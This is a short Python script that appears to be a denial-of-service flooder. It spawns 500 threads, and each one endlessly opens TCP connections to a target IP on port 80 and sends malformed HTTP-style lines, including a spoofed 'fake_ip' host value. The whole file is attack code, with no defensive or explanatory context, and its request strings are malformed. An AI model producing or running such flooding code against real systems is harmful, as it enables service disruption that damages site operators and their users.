import socket
import threading

target = "192.168.0.1"
port =80
fake_ip="182.32.20.34"

pings=0

def ping():
    global pings
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("gg "+target+"HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.sendto(("host "+fake_ip+"HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.close()
        pings+=1
        print(pings)

num_pings=500
for i in range(num_pings):
    thread=threading.Thread(target=ping)
    thread.start()
